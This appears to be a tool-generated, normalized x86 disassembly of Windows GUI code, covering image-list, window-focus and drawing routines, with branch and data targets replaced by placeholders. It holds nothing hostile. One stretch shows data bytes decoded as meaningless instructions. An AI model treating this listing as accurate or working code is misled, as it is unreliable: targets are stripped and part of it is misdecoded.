mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_4474a4
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_44726c
jmp r-xdata
mov eax [ ebx ]
call sub_4482ac
call sub_43bb34
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447ad9
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x44 ]
mov edx [ r-xdata ]
call sub_4060ac
retn
lea eax [ ebp - 0x4c ]
mov dl 0x1
call sub_44ee0c
call sub_444a08
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x38 ] eax
call sub_4474dc
add [ ebp - 0x38 ] eax
mov eax [ rw-data ]
call sub_443d84
mov [ ebp - 0x34 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4501b4
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x54 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x58 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x58 ]
sub eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x5c ]
sub eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x4c ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4503d4
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4449d0
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_44d564
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0xc ]
call sub_4055c8
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_451b4c
test eax eax
sete [ ebp - 0x5d ]
cmp [ ebp - 0x5d ] 0x0
je r-xdata
cmp [ esi + 0x1c4 ] 0x0
je r-xdata
cmp [ ebp - 0x5d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x15a ] 0x0
je r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ esi + 0x1c4 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x5d ]
lea edx [ ebp - 0xc ]
mov esi [ ebx ]
mov eax [ esi + 0x15c ]
call [ esi + 0x158 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0xc ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x40 ]
call sub_447634
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
movzx edx [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x6d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x34 ]
mov esi [ eax ]
call [ esi + 0xe8 ]
mov eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x6d ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc7
call sub_40484c
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x2c ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_450324
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x24 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_450324
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x30 ]
call sub_450a08
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0xc ]
lea edx [ ebp - 0x6d ]
mov esi [ eax ]
call [ esi + 0xe4 ]
call sub_444b1c
mov eax [ ebp - 0x14 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0xc ]
call sub_447694
pop ecx
add eax 0x5
sub [ ebp - 0x6d ] eax
sub [ ebp - 0x65 ] eax
mov cl 0x1
mov edx [ ebp - 0x10 ]
mov eax [ ebx ]
call sub_44726c
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_44726c
jmp r-xdata
sub_447ae0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov esi eax
xor ebx ebx
jmp r-xdata
mov eax [ esi + 0xd0 ]
call sub_40676c
cmp ebx eax
jl r-xdata
lea edi [ ebx + ebx * 2 ]
mov eax [ esi + 0xd0 ]
cmp ebp [ eax + edi * 4 + 0x4 ]
jne r-xdata
mov eax [ esi + 0xcc ]
mov [ esp ] eax
inc [ esi + 0xcc ]
mov eax [ esi + 0xd0 ]
call sub_40676c
cmp ebx eax
jl r-xdata
mov eax [ esi + 0xd0 ]
cmp [ eax + edi * 4 ] 0xffffffff
je r-xdata
mov eax [ esi + 0xd0 ]
mov eax [ eax + edi * 4 ]
mov [ esp ] eax
jmp r-xdata
lea eax [ ebx + ebx * 2 ]
mov edx [ esi + 0xd0 ]
mov ecx [ esp ]
mov [ edx + eax * 4 ] ecx
mov edx [ esi + 0xd0 ]
mov [ edx + eax * 4 + 0x4 ] ebp
mov edx [ esi + 0xd0 ]
cmp [ ebp + 0x344 ] 0x0
setne cl
mov [ edx + eax * 4 + 0x8 ] cl
mov eax [ esi + 0xd0 ]
call sub_40676c
mov ebx eax
lea eax [ ebx + 0x1 ]
push eax
lea eax [ esi + 0xd0 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
inc ebx
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_447ba8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_405584
cmp [ ebx + 0x284 ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x284 ]
call sub_405584
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_447be4
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
cmp [ ebx + 0xf2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov edx esp
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
cmp [ esp ] 0x0
jne r-xdata
call GetActiveWindow
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call GetLastActivePopup
mov [ esp ] eax
sub_447c2c
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
cmp [ ebx + 0xfa ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov edx esp
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
mov eax [ esp ]
pop edx
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax [ ebx + 0x44 ]
call sub_4585f8
mov [ esp ] eax
sub_447c6c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_451b4c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_451b4c
dec eax
je r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_44a8b4
sub_447d04
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xda ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_447d2c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xe2 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_447dd0
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
xor ebx ebx
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ edi ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
mov eax ebp
call sub_44d2f4
mov esi eax
test esi esi
jne r-xdata
cmp ebp [ eax + 0x29c ]
jne r-xdata
test esi esi
je r-xdata
push ebp
call GetParent
mov ebp eax
test ebp ebp
je r-xdata
mov esi eax
jmp r-xdata
mov edx edi
mov eax esi
mov si 0xffb1
call sub_40484c
mov ebx eax
mov eax ebp
call sub_44d2f4
mov esi eax
test esi esi
je r-xdata
sub_447e48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41dc40
mov esi eax
mov eax ebx
call sub_447e3c
mov [ eax + 0x18 ] esi
pop esi
pop ebx
retn
sub_447e64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d0e0
push eax
mov eax ebx
call sub_447e3c
pop edx
mov [ eax + 0x8 ] dl
pop esi
pop ebx
retn
sub_447e80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41dc40
mov esi eax
mov eax ebx
call sub_447e3c
mov [ eax + 0xc ] esi
pop esi
pop ebx
retn
sub_447e9c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41dc40
mov esi eax
mov eax ebx
call sub_447e3c
mov [ eax + 0x14 ] esi
pop esi
pop ebx
retn
sub_447eb8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d0e0
push eax
mov eax ebx
call sub_447e3c
pop edx
mov [ eax + 0x28 ] dl
pop esi
pop ebx
retn
sub_447ed4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41dc40
mov esi eax
mov eax ebx
call sub_447e3c
mov [ eax + 0x10 ] esi
pop esi
pop ebx
retn
sub_447ef0
push ebx
add esp 0xfffffff0
mov ebx eax
call sub_42fb10
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_458904
test al al
je r-xdata
add esp 0x10
pop ebx
retn
push 0xffffffff
push 0x0
mov eax ebx
call sub_4585f8
push eax
call InvalidateRect
mov eax ebx
call sub_447e3c
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax esp
xor ecx ecx
mov edx 0x10
call sub_403af4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax ebx
call sub_4585f8
mov edx esp
call sub_42f9e4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
push 0xffffffff
push 0x0
mov eax ebx
call sub_4585f8
push eax
call InvalidateRect
jmp r-xdata
mov [ esp ] 0xffffffff
mov [ esp + 0x4 ] 0xffffffff
mov [ esp + 0x8 ] 0xffffffff
mov [ esp + 0xc ] 0xffffffff
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ esp ] edx
mov edx [ eax + 0x14 ]
mov [ esp + 0x4 ] edx
mov edx [ eax + 0x10 ]
mov [ esp + 0x8 ] edx
mov eax [ eax + 0x18 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
sub_448068
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_404620
mov [ edi + 0x4 ] esi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x10 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
xor eax eax
mov [ edi + 0x18 ] eax
mov [ edi + 0x28 ] 0x0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_4480bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419e40
pop esi
pop ebx
retn
mov eax esi
movzx edx [ eax + 0x8 ]
mov [ ebx + 0x8 ] dl
mov edx [ eax + 0xc ]
mov [ ebx + 0xc ] edx
mov edx [ eax + 0x10 ]
mov [ ebx + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebx + 0x14 ] edx
mov edx [ eax + 0x18 ]
mov [ ebx + 0x18 ] edx
movzx eax [ eax + 0x28 ]
mov [ ebx + 0x28 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_448128
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call sub_42fb10
test al al
je r-xdata
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
sub_448160
push ebx
mov ebx eax
cmp dl [ ebx + 0x8 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x8 ] dl
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x350 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebx + 0x4 ]
call sub_443544
sub_448190
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
mov [ esi + 0xc ] ecx
inc ecx
jne r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
mov [ esi + 0x10 ] ecx
inc ecx
jne r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
mov [ esi + 0x14 ] ecx
inc ecx
jne r-xdata
cmp ecx [ esi + 0x18 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
mov [ esi + 0x18 ] ecx
inc ecx
jne r-xdata
pop esi
retn
mov [ esi + 0x28 ] 0x1
sub_4481f0
cmp dl [ eax + 0x28 ]
je r-xdata
retn
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov [ eax + 0x28 ] dl
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ eax + 0xc ] 0xffffffff
je r-xdata
cmp [ eax + 0x10 ] 0xffffffff
je r-xdata
cmp [ eax + 0x14 ] 0xffffffff
je r-xdata
cmp [ eax + 0x18 ] 0xffffffff
je r-xdata
sub_448224
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
call sub_43b75c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov [ rw-data ] 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x273 ] 0x1
jne r-xdata
mov eax ebx
call sub_445490
mov dl 0x1
mov eax ebx
call sub_4455ec
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x57 ] 0x0
jne r-xdata
cmp [ ebx + 0x14a ] 0x0
je r-xdata
mov eax esi
call sub_4585f8
push eax
call SetFocus
xor edx edx
call sub_43fdb4
mov eax [ ebx + 0x44 ]
call sub_442bac
mov edx ebx
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_4482b4
add [ eax ] eax
add [ eax ] al
add [ 0xffffffffcddc0049 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_448327
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44832e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_43b898
mov eax sub_43bb78
call sub_4193cc
mov eax rw-data
mov edx [ r-xdata ]
call sub_406934
mov eax [ rw-data ]
push eax
call CloseHandle
sub_4484c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41ffc4
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_448510
push ebx
push esi
push edi
call sub_404a1c
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_419980
mov edx eax
mov eax edi
call sub_44910c
mov eax [ edi + 0x50 ]
call sub_404650
mov eax edi
call sub_4487d4
mov eax [ edi + 0x4c ]
call sub_404650
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420010
test bl bl
jle r-xdata
call sub_404650
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4049c4
sub_44857c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_448629
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_449094
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4293dc
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_448648
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448630
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_448648
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4486e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_42a5c4
mov eax ebx
call sub_4299b0
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424fb8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_418448
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_4299b0
pop edx
call sub_42535c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4486f0
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_44870c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_448648
pop ecx
pop edx
pop ebx
retn
sub_448744
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4487d4
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44870c
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_40484c
sub_448780
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44901c
test esi esi
je r-xdata
mov eax [ ebx + 0x50 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov eax esi
call sub_429a1c
cmp al 0x1
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x68 ]
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x68 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4487d4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_448634
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_40484c
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_448770
push eax
call ImageList_Destroy
sub_44880c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44889e
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
movzx eax [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_448634
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4488a5
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov edx eax
mov eax ebx
call sub_448a34
sub_4488ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4293dc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44895b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4293dc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44893e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44863c
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_448780
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_448780
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448945
mov eax [ ebp - 0x10 ]
call sub_404650
retn
sub_448978
push ebx
mov ebx eax
mov eax ebx
call sub_448634
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_448770
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_44899c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_448a1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_448978
cmp esi eax
jl r-xdata
mov eax ebx
call sub_448634
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
mov eax ebx
mov si 0xffef
call sub_40484c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448a22
lea eax [ ebp - 0x4 ]
call sub_405530
retn
push esi
mov eax ebx
call sub_448770
push eax
call ImageList_Remove
sub_448a34
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448634
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_448484
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_40484c
pop esi
pop ebx
retn
sub_448a6c
push ebx
mov ebx eax
mov eax ebx
call sub_448634
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_448770
push eax
call ImageList_GetBkColor
call sub_4484a4
pop ebx
retn
sub_448a94
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_448634
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_448484
push eax
mov eax ebx
call sub_448a6c
call sub_448484
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_425714
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_448770
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_4299b0
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_424fb8
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_418448
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_4299b0
pop edx
call sub_42535c
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_4299b0
call sub_425714
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_448770
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_418448
